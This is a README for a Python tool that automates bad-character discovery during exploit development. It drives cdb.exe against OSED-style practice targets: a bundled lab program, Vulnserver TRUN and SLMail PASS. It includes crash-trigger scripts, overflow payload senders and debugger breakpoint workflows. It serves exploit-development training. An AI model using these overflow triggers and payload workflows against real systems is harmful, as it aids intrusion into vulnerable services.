# badchars_wds

Automated bad-character discovery for exploit development. Drives `cdb.exe`
under the hood, iteratively sends test payloads, dumps the destination buffer
after each send, and compares observed bytes against expected to identify
characters the target mangles, truncates, or rejects.

Designed for OSED-style targets running on a Windows VM with Python 3.7+.
Pure stdlib, no external dependencies.

---

## Table of contents

1. [How it works](#how-it-works)
2. [Quick start](#quick-start)
3. [The generic workflow](#the-generic-workflow)
4. [Worked examples](#worked-examples)
   - [Example 1 — Local lab target (synthetic bad chars)](#example-1--local-lab-target-synthetic-bad-chars)
   - [Example 2 — Vulnserver TRUN (simple real-world target)](#example-2--vulnserver-trun-simple-real-world-target)
   - [Example 3 — SLMail PASS (unknown target walkthrough)](#example-3--slmail-pass-unknown-target-walkthrough)
5. [Config reference](#config-reference)
6. [Troubleshooting](#troubleshooting)

---

## How it works

Each iteration sends a payload of the form:

```
[A * offset][MAGIC][candidate_bytes][C * 32]
```

`MAGIC` is a 4-byte sentinel (`bcf0bcf0`) that lets the framework verify it is
reading the right buffer. `candidate_bytes` is `0x01..0xff` minus any bytes
already known to be bad.

A breakpoint set in the debugger script (`.wds`) fires when the target copies
input into its destination buffer. The breakpoint runs `.writemem` to dump 512
bytes of the destination buffer to disk. Python polls for that file, validates
the magic prefix, and compares the next 255 bytes against the candidate set:

- If they match exactly → no bad chars, run terminates with `CLEAN`
- If a byte differs → the missing byte is added to the exclusion set, then a
  new iteration runs with that byte stripped from the candidates
- If observed bytes are short → first missing byte is treated as bad

The loop continues until all candidates round-trip cleanly, or `max_iterations`
is reached.

---

## Quick start

```powershell
# On Windows VM
$env:PYTHONPATH = "C:\Users\dooley\Documents\OSED"
py C:\Users\dooley\Documents\OSED\badchars_wds\run_badchars.py `
   --config C:\Users\dooley\Documents\OSED\badchars_wds\config.json
```

The script prints `Confirmed bad chars: 0xNN 0xNN ...` on completion.

---

## The generic workflow

For any new target, the work is always the same five steps:

### Step 1 — Find the overflow offset

Use a cyclic pattern (msf-pattern-create, mona.py pattern_create, or your own
generator). Send it, capture the value of EIP at the crash, locate the offset.

This is *not* automated by this framework. It is exploit-dev prerequisite work.

### Step 2 — Find the copy function

Attach cdb to the target. Set a breakpoint on the standard copy primitives:

```
0:000> bp msvcrt!strcpy
0:000> bp msvcrt!strncpy
0:000> bp msvcrt!memcpy
0:000> bp msvcrt!sprintf
0:000> g
```

Send your crash-trigger payload. Note which breakpoint fires with your data
visible (`db @edx L20`, `db poi(@esp+8) L20`, etc.). That's the copy function.

For targets without these standard functions, set a hardware write breakpoint
on the destination buffer (`ba w4 <dst_addr>`) — it will trip on the
instruction that performs the copy, regardless of how the copy is implemented.

### Step 3 — Choose the breakpoint location

There are two strategies:

**(a) Source-before-copy.** Break at the *call-site* of the copy function
(the `call` instruction in the target binary, not the function entry). This is
the more reliable choice because the source buffer is stable, while the
destination buffer may be partially overwritten by the time a crash occurs.

At the call-site, before the `call` executes:
- `[esp]` = first argument (dst for strcpy-family)
- `[esp+4]` = second argument (src)

**(b) Destination-after-copy.** Break at the `ret` instruction of a wrapper
function around the copy. At the `ret`:
- `eax` = return value (for strcpy-family, this is dst)
- `poi(@esp+4)` = first argument (still on the stack through cdecl ret)

Use (a) for crash-per-payload targets (Vulnserver). Use (b) for persistent
services where the copy completes cleanly without crashing (lab targets,
SLMail).

### Step 4 — Calculate `dump_expr`

You want the address where MAGIC lands in whichever buffer you're dumping.

If breaking on source-before-copy:
```
dump_expr = poi(@esp+4) + 0x{prefix_len_hex}
```
where `prefix_len` is the byte length of whatever your sender prepends to the
orchestrator's payload (e.g. `TRUN /.:/.` = 10 bytes = `0xa`).

If breaking on destination-after-copy:
```
dump_expr = @eax + 0x{offset_hex}
```
where `offset` is the orchestrator's `offset` field (the number of A-bytes
before MAGIC in the payload).

> **WinDbg uses hex by default.** A decimal `2006` is interpreted as `0x2006`
> (= 8198 decimal). Always write offsets in `dump_expr` as `0x...` or prefix
> them with `0n` for explicit decimal.

### Step 5 — Write the sender

The orchestrator constructs `payload = b"A" * offset + MAGIC + candidates +
b"C" * 32` and hands it to your sender. The sender owns the protocol envelope.

Three transport types are built in:
- `tcp` — plain TCP, no banner handling
- `udp` — UDP datagram
- `callback` — points to a Python function you write

Most real targets need `callback` because they require banners, handshakes, or
protocol-specific prefixes. See examples below for templates.

### Verify manually before automating

Always do one manual cdb session before running automated. This catches
breakpoint/dump_expr mistakes in 30 seconds instead of one iteration timeout
(10+ seconds) later.

```
0:000> bp <target>+0x???? ".writemem C:/dbg/dump.bin <dump_expr> (<dump_expr>)+0x200; g"
0:000> g
```

Send one framework-style payload by hand. Then in Python:

```python
with open(r"C:\dbg\dump.bin","rb") as f: data = f.read()
print(data[:4].hex())          # must be: bcf0bcf0
print(data[4:259] == bytes(range(1, 256)))  # must be: True
```

If both pass, run automated. If not, the manual cdb session is where you
debug — not the automation log.

---

## Worked examples

### Example 1 — Local lab target (synthetic bad chars)

The `lab_targets/native/badchar_target.c` source is included in this repo. It
listens on TCP and, in `truncate` mode, drops anything after the first byte in
its trigger list. This is the smoke test that proves the detection path works
end-to-end.

**Config (`config.lab.json`):**

```json
{
    "driver": {
        "cdb_path":       "C:\\Users\\dooley\\Documents\\windbg\\x86\\cdb.exe",
        "target_command": [
            "C:\\path\\to\\badchar_target.exe",
            "--host", "127.0.0.1", "--port", "9999",
            "--mode", "truncate",
            "--trigger-byte", "0x05",
            "--trigger-byte", "0x0a",
            "--trigger-byte", "0x0d"
        ],
        "log_path": "C:/dbg/lab_cdb.log"
    },
    "stage": {
        "breakpoint":      "badchar_target!call_strcpy+0x14",
        "dump_expr":       "@eax+0x7d6",
        "dump_size":       512,
        "step_mode":       "none",
        "temp_dump_path":  "C:/dbg/dump.bin",
        "final_dump_path": "C:/dbg/dump.bin"
    },
    "orchestrator": {
        "offset":         2006,
        "dump_dir":       "C:/dbg",
        "magic":          "bcf0bcf0",
        "timeout":        10.0,
        "restart_delay":  1.0,
        "max_iterations": 260,
        "excluded_bytes": [0],
        "restart_policy": "conditional"
    },
    "transport": {
        "type":    "tcp",
        "host":    "127.0.0.1",
        "port":    9999,
        "timeout": 3.0
    }
}
```

**Why these values:**
- `breakpoint: call_strcpy+0x14` — the `ret` of the wrapper function. Symbol
  + offset survives recompiles.
- `dump_expr: @eax+0x7d6` — EAX holds the return value of strcpy (= dst),
  and `0x7d6` is hex for the decimal offset `2006`.
- `offset: 2006` — A-filler that pads to the overflow distance. Magic lands
  at `dst + 2006` in the destination.
- `transport: tcp` — the lab target speaks no banner protocol; raw TCP is
  enough.

**Expected output:**
```
Confirmed bad chars: 0x05 0x0a 0x0d
```

Run again with `--mode normal` (no trigger bytes) to see the clean baseline:
```
Confirmed bad chars:
```

---

### Example 2 — Vulnserver TRUN (simple real-world target)

[Vulnserver](https://github.com/stephenbradshaw/vulnserver) is the canonical
first OSED-style exploit target. Crashes on long input to the `TRUN` command.

**Config (`config.vulnserver-trun.json`):**

```json
{
    "driver": {
        "cdb_path":       "C:\\Users\\dooley\\Documents\\windbg\\x86\\cdb.exe",
        "target_command": ["C:\\path\\to\\vulnserver.exe"],
        "log_path":       "C:/dbg/vulnserver_cdb.log"
    },
    "stage": {
        "breakpoint":      "vulnserver+0x1821",
        "dump_expr":       "poi(@esp+4)+0xa",
        "dump_size":       512,
        "step_mode":       "none",
        "temp_dump_path":  "C:/dbg/dump.bin",
        "final_dump_path": "C:/dbg/dump.bin"
    },
    "orchestrator": {
        "offset":         0,
        "dump_dir":       "C:/dbg",
        "magic":          "bcf0bcf0",
        "timeout":        15.0,
        "restart_delay":  3.0,
        "max_iterations": 260,
        "excluded_bytes": [0],
        "restart_policy": "conditional"
    },
    "transport": {
        "type":          "callback",
        "callback_name": "senders.vulnserver_trun:send"
    }
}
```

**Sender (`senders/vulnserver_trun.py`):**

```python
import socket

HOST    = "192.168.1.114"
PORT    = 9999
PREFIX  = b"TRUN /.:/."    # 10 bytes — must match dump_expr offset (0xa)
SUFFIX  = b"\r\n"
TIMEOUT = 5.0


def send(payload):
    # type: (bytes) -> None
    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as s:
        s.recv(1024)                       # consume welcome banner
        s.sendall(PREFIX + payload + SUFFIX)
```

Also create an empty `senders/__init__.py`.

**Why these values:**
- `breakpoint: vulnserver+0x1821` — the *call-site* of strcpy inside the
  TRUN handler. Found by setting `bp msvcrt!strcpy`, sending one payload,
  then running `u poi(@esp)-5` to back up to the `call` instruction.
- `dump_expr: poi(@esp+4)+0xa` — at the call-site, `[esp+4]` is the src
  argument (which still has the full received data). `+0xa` skips the
  10-byte `TRUN /.:/.` prefix.
- `offset: 0` — no A-filler needed; magic sits immediately after the
  prefix in the payload.
- `restart_delay: 3.0` — Vulnserver crashes per payload and the orchestrator
  must restart the cdb process each iteration. Three seconds gives the OS
  time to release port 9999 before the next process binds it.
- `transport: callback` — Vulnserver sends a welcome banner on connect and
  needs the `TRUN /.:/.` envelope around our payload, so the plain TCP sender
  won't work.

**Expected output:**
```
Confirmed bad chars:
```

(empty — TRUN famously has no bad chars in its argument other than `\x00`,
which is pre-excluded)

---

### Example 3 — SLMail PASS (unknown target walkthrough)

This example shows the full investigative process for a target you've never
seen before. SLMail is a Windows mail server with a buffer overflow in the
POP3 `PASS` command. It's stateful (must send `USER` before `PASS`), runs as
a persistent service, and uses a non-msvcrt copy function — three things that
the simpler examples didn't cover.

#### Step 1 — Find the overflow offset

Outside the scope of this framework. Standard procedure:

```python
# crash.py
import socket
s = socket.create_connection(("192.168.1.50", 110), timeout=5)
s.recv(1024)
s.sendall(b"USER test\r\n")
s.recv(1024)
s.sendall(b"PASS " + b"A" * 3000 + b"\r\n")
s.close()
```

Run with a debugger attached, take the cyclic-pattern offset of EIP, get
`offset = 2606`. Note this number; it goes into `orchestrator.offset` later.

#### Step 2 — Find the copy function

Attach cdb to SLMail (`cdb.exe -p <pid>` or launch under cdb). Set
breakpoints on the standard copy primitives:

```
0:000> bp msvcrt!strcpy
0:000> bp msvcrt!strncpy
0:000> bp msvcrt!memcpy
0:000> bp msvcrt!sprintf
0:000> g
```

Run the crash script. Most likely **none** of these fire — SLMail uses
its own internal copy loop. So switch strategies: send a recognisable
short payload first, find where it lands in memory, then set a hardware
write breakpoint:

```
0:000> g
[send: PASS AAAAW00TW00T...]
0:000> .echo find the buffer:
0:000> s -a 0 L?80000000 "W00TW00T"
   ...
   001abc40  "W00TW00TAAAA..."
0:000> ba w4 001abc40
0:000> g
[send the crash payload again]
```

The `ba w4` breakpoint fires on the instruction performing the copy. From
there, walk up the call stack (`k`) to find the function containing that
instruction. Disassemble it (`uf <addr>`) and look for the `rep movs` or
loop pattern.

For SLMail, the copy happens inside `SLMFC.dll` (or `SLMAIL.exe` depending
on version). Let's pretend you found it at `SLMFC+0xa1cb` — a `rep movsb`
instruction inside an unwound `memcpy` clone.

#### Step 3 — Choose the breakpoint

SLMail is a **persistent service** — it doesn't die after each PASS attempt.
You can safely use the destination-after-copy strategy: break right after
the copy loop completes and dump the destination buffer.

Disassemble forward from the `rep movsb` to find the next `ret` or stable
post-copy instruction:

```
0:000> uf SLMFC+0xa1cb
   ...
SLMFC+0xa1cb   rep movsb           ← the copy itself
SLMFC+0xa1cd   pop esi
SLMFC+0xa1ce   pop edi
SLMFC+0xa1cf   leave
SLMFC+0xa1d0   ret                 ← break here
```

At the `ret`, `eax` is whatever the function returns (may or may not be dst).
Safer: examine `ebp+8` (the first stack argument), which is preserved across
the function for any standard prologue. Or just snapshot what's in registers
manually at the `ret` and pick the one pointing at your data.

After manual inspection, suppose `edi-2606` points at the start of the
destination (because `rep movsb` advances `edi`). Then:

```
dump_expr = @edi - 0xa2e
```

Where `0xa2e` is `2606` in hex.

> If picking `dump_expr` from registers feels brittle, the alternative is
> always: set the breakpoint at the *function entry* of whatever called the
> copy, capture the dst pointer from `[esp+4]` or `[ebp+8]`, then trace
> forward — same idea as Example 1.

#### Step 4 — Write the sender

POP3 is stateful. The framework's `callback` transport handles arbitrary
protocol envelopes.

**Sender (`senders/slmail_pass.py`):**

```python
import socket

HOST    = "192.168.1.50"
PORT    = 110
TIMEOUT = 5.0


def send(payload):
    # type: (bytes) -> None
    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as s:
        s.recv(1024)                          # +OK welcome banner
        s.sendall(b"USER test\r\n")
        s.recv(1024)                          # +OK user accepted
        s.sendall(b"PASS " + payload + b"\r\n")
        try:
            s.recv(1024)                      # may or may not respond
        except socket.timeout:
            pass
```

Note: the orchestrator's `payload` does **not** include `PASS ` — that's
part of the protocol envelope and lives in the sender. The orchestrator
controls only the bytes after `PASS `, which is where the overflow lives.

#### Step 5 — Config

**Config (`config.slmail.json`):**

```json
{
    "driver": {
        "cdb_path":       "C:\\Users\\dooley\\Documents\\windbg\\x86\\cdb.exe",
        "target_command": ["C:\\Program Files\\SLmail\\SLmail.exe"],
        "log_path":       "C:/dbg/slmail_cdb.log"
    },
    "stage": {
        "breakpoint":      "SLMFC+0xa1d0",
        "dump_expr":       "@edi-0xa2e",
        "dump_size":       512,
        "step_mode":       "none",
        "temp_dump_path":  "C:/dbg/dump.bin",
        "final_dump_path": "C:/dbg/dump.bin"
    },
    "orchestrator": {
        "offset":         2606,
        "dump_dir":       "C:/dbg",
        "magic":          "bcf0bcf0",
        "timeout":        15.0,
        "restart_delay":  1.0,
        "max_iterations": 260,
        "excluded_bytes": [0],
        "restart_policy": "conditional"
    },
    "transport": {
        "type":          "callback",
        "callback_name": "senders.slmail_pass:send"
    }
}
```

**Why these values:**
- `breakpoint: SLMFC+0xa1d0` — the `ret` after the `rep movsb` copy loop
  inside the PASS handler.
- `dump_expr: @edi-0xa2e` — at the `ret`, `edi` points at the byte *after*
  the copy ended; subtracting the payload length reaches the start of dst.
- `offset: 2606` — A-filler that pads to the EIP-overwrite distance. Magic
  lands at `dst + 2606` in the destination.
- `restart_delay: 1.0` — SLMail is a persistent service, so the driver
  typically does not restart between iterations. The short delay covers the
  rare case where SLMail's worker thread dies and the orchestrator must
  reattach.
- `transport: callback` — POP3 requires stateful USER/PASS handshake.

#### Step 6 — Verify manually

Before running 260 iterations, do one cdb pass by hand:

```
0:000> bp SLMFC+0xa1d0 ".writemem C:/dbg/dump.bin @edi-0xa2e (@edi-0xa2e)+0x200; g"
0:000> g
```

Then send the smoke-test payload from Python:

```python
import socket
MAGIC = b"\xbc\xf0\xbc\xf0"
candidates = bytes(range(1, 256))
payload = b"A" * 2606 + MAGIC + candidates + b"C" * 32

s = socket.create_connection(("192.168.1.50", 110), timeout=5)
s.recv(1024); s.sendall(b"USER test\r\n")
s.recv(1024); s.sendall(b"PASS " + payload + b"\r\n")
s.close()
```

Then check:
```python
with open(r"C:\dbg\dump.bin","rb") as f: data = f.read()
print(data[:4].hex())              # bcf0bcf0
print(data[4:259] == candidates)   # True
```

If green, run automated. Expected SLMail PASS result:
```
Confirmed bad chars: 0x0a 0x0d
```

(SLMail terminates the PASS string on `\n` and `\r`. Real result on
the OSED VM is `[0x00, 0x0a, 0x0d]`, with `0x00` pre-excluded.)

---

## Config reference

```json
{
  "driver": {
    "cdb_path":       "path to cdb.exe (32-bit cdb for 32-bit targets)",
    "target_command": ["target.exe", "arg1", "arg2"],
    "log_path":       "path/to/cdb-stdout.log (optional)"
  },
  "stage": {
    "breakpoint":      "module+0xRVA  or  module!symbol+0xN",
    "dump_expr":       "WinDbg expression (HEX OFFSETS!) for dump start",
    "dump_size":       512,
    "step_mode":       "none | pt | gu | custom",
    "custom_step":     "raw cdb command, only if step_mode = custom",
    "temp_dump_path":  "path .writemem writes to before atomic rename",
    "final_dump_path": "path the orchestrator polls"
  },
  "orchestrator": {
    "offset":         "decimal A-bytes before MAGIC in payload",
    "dump_dir":       "directory for dump.bin and badchar_bp.wds",
    "magic":          "hex string, default bcf0bcf0",
    "timeout":        "per-iteration timeout in seconds (float)",
    "restart_delay":  "seconds to wait after driver.start() before first poll",
    "max_iterations": "safety cap on iteration count",
    "excluded_bytes": "[0] minimum — extend if magic overlaps target's bad set",
    "restart_policy": "conditional | always"
  },
  "transport": {
    "type":          "tcp | udp | callback",
    "host":          "tcp/udp only",
    "port":          "tcp/udp only",
    "timeout":       "tcp/udp only",
    "callback_name": "callback only — 'module:attr' or 'module.attr'"
  }
}
```

### Field gotchas

- **`dump_expr` hex.** WinDbg evaluates numbers as hex unless prefixed with
  `0n`. `+2006` means `+0x2006` (= 8198 decimal). Always write `+0x7d6` or
  `+0n2006` for the decimal offset `2006`.
- **`breakpoint` format.** `module+0xRVA` is faster (no symbol lookup); use
  `module!symbol+0xN` if symbols are reliable and the RVA might shift.
- **`step_mode`.** Leave `none` unless you have a wrapper function and need
  to advance to `ret`. The `pt` and `gu` commands inside a bp body
  occasionally trigger "Some commands were skipped because previous commands
  caused target execution inside an event handler" — when that happens,
  switch to breaking directly at the `ret` instruction with `step_mode: none`.
- **`magic` overlap with bad chars.** If your target's expected bad chars
  include any byte in MAGIC (default contains `0xbc` and `0xf0`), construction
  raises `ValueError`. Change MAGIC to e.g. `aabbccdd` and ensure no overlap.
- **`temp_dump_path` vs `final_dump_path`.** If equal, no rename happens.
  If different, `.writemem` writes to temp, then `.shell -ci "cmd /c move
  /Y temp final"` atomically renames. Equal paths are fine for most cases.

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `status=invalid_dump reason=magic_mismatch found=0x00000000` | Reading from a buffer that hasn't been written yet, or stale `dump.bin` left over from prior run | Delete `C:/dbg/dump.bin` and `C:/dbg/badchar_bp.wds` before re-running. Verify `dump_expr` resolves to the populated buffer. |
| `status=invalid_dump reason=magic_mismatch found=0x......` (non-zero) | `dump_expr` off by one or more bytes (often a forgotten prefix char) | Compare the raw bytes against your sender's PREFIX. The found magic shifted N bytes left means the dump should be at `+N` further. |
| `status=timeout reason=dump_not_found` | Breakpoint never fired, or fired but `.writemem` was skipped | Open cdb log (`log_path`), check for `BP_HIT` or `Writing N bytes`. If neither: breakpoint address is wrong. If `Writing` is present but no file appears: check `temp_dump_path` permissions. |
| `ConnectionRefusedError` on first iteration | Target hasn't bound to its port yet when sender fires | Increase `restart_delay`. Vulnserver needs ~3s; SLMail can need 5s+ on first start. |
| `Some commands were skipped because previous commands caused target execution inside an event handler` in cdb log | `pt` or `gu` inside a bp body where the target crashes during the step | Set `step_mode: none` and put the breakpoint directly at the post-copy instruction instead of stepping. |
| Wrong breakpoint hits during target startup (e.g. msvcrt!strcpy fires for unrelated copies) | Generic library breakpoint catches startup paths | Switch to a **call-site** breakpoint inside the target binary (`<target_module>+0xRVA`) — it only fires when *your* code path is taken. |
| Symbols don't resolve (`badchar_target!call_strcpy` not found) | Stale or missing PDB next to the EXE | Recompile with `/Zi`, ensure `.pdb` is next to `.exe`. Or fall back to numeric RVA. |
| `Confirmed bad chars:` empty when you expected something | Either (a) the target really has no bad chars in this position, or (b) the magic check is silently failing every iteration as INVALID_DUMP | Re-run with `-v` logging or check the log for `status=invalid_dump`. Smoke-test against the lab target with `--mode truncate --trigger-byte 0x05` first. |

---

## Files in this package

```
badchars_wds/
├── __init__.py
├── analyzer.py        # candidate generation + byte comparison
├── cdb.py             # subprocess wrapper for cdb.exe
├── models.py          # Stage, WDSConfig, ComparisonResult types
├── orchestrator.py    # iteration state machine
├── run_badchars.py    # CLI entry point
├── transport.py       # TCP/UDP/callback senders
├── wds.py             # .wds script generator
├── lab_targets/
│   └── native/
│       └── badchar_target.c
└── senders/           # user-written protocol-specific senders
    ├── __init__.py
    ├── vulnserver_trun.py
    └── slmail_pass.py
```

The framework code (`analyzer.py`, `cdb.py`, `models.py`, `orchestrator.py`,
`transport.py`, `wds.py`, `run_badchars.py`) is generic and target-independent.
Everything you change per target lives in the JSON config and the sender
under `senders/`.
